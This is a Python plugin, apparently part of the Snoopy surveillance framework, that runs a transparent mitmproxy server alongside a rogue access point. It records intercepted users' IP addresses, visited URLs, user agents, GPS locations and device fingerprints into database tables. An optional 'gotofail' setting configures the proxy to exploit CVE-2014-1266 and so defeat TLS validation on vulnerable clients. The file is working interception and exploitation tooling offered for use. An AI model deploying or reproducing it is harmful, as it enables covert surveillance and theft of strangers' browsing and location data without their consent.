#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import logging

from threading import Thread
from libmproxy import flow
from libmproxy.proxy import config, server
from sqlalchemy import Float, DateTime, String, Text, Integer, Table, MetaData, Column
from includes.fonts import *
from includes.mitm import *

class Snoop(Thread):
    """
    This plugin runs the mitmproxy daemon for traffic interception.
    """
    def __init__(self, **kwargs):
        self.gotofail = kwargs.get("gotofail", False)
        self.verb = kwargs.get("verbose", 1)
        self.port = 8080
        self.fname = os.path.splitext(os.path.basename(__file__))[0]

        if (self.gotofail == "True"):
            conf = config.ProxyConfig(mode="transparent", certforward=True,
                    ciphers="DHE-RSA-AES256-SHA")
        else:
            conf = config.ProxyConfig(mode="transparent")

        self.proxy = SnoopyMaster(server=server.ProxyServer(conf, self.port),
            state=flow.State(), dbms=kwargs.get("dbms"),
            run_id=kwargs.get("run_id"), plugin_name=self.fname)

        Thread.__init__(self)
        self.setName("mitmproxy")

    def is_ready(self):
        return True

    def run(self):
        logging.info("Plugin %s%s%s started proxy on port %s%s%s" % (GR,self.fname,G,GR,self.port,G))
        self.proxy.run()

    def stop(self):
        self.proxy.shutdown()

    def get_data(self):
        web_logs = []
        while self.proxy.logs:
            web_logs.append(self.proxy.logs.popleft())

        web_locations = []
        while self.proxy.locations:
            web_locations.append(self.proxy.locations.popleft())

        web_fingerprints = []
        while self.proxy.fingerprints:
            web_fingerprints.append(self.proxy.fingerprints.popleft())

        return [("web_logs", web_logs), ("web_locations", web_locations), ("web_fingerprints", web_fingerprints)]

    @staticmethod
    def get_parameter_list():
        info = {"info" : "This plugin runs a mitmproxy server. It's useful in conjunction with iptables and rogueAP.",
                "parameter_list" : [
                ("gotofail=[True|False]","Attempt to set up the proxy to exploit CVE-2014-1266. Requires manual install of mitmproxy from github master.")]
                }
        return info

    @staticmethod
    def get_tables():
        web_logs = Table('web_logs', MetaData(),
            Column('client_ip', String(length=15)),
            Column('timestamp', DateTime),
            Column('protocol', String(length=10)),
            Column('method', String(length=7)),
            Column('host', String(length=255)),
            Column('url', Text),
            Column('useragent', Text),
            Column('sunc', Integer, default=0)
        )

        web_locations = Table('web_locations', MetaData(),
            Column('client_ip', String(length=15)),
            Column('timestamp', DateTime),
            Column('useragent', Text),
            Column('lat', Float()),
            Column('lon', Float()),
            Column('speed', Float()),
            Column('alt', Float()),
            Column('sunc', Integer, default=0)
        )

        web_fingerprints = Table('web_fingerprints', MetaData(),
            Column('client_ip', String(length=15)),
            Column('timestamp', DateTime),
            Column('useragent', Text),
            Column('fingerprint', Integer()),
            Column('sunc', Integer, default=0)
        )

        return [web_logs, web_locations, web_fingerprints]

if __name__ == "__main__":
    Snoop().start()

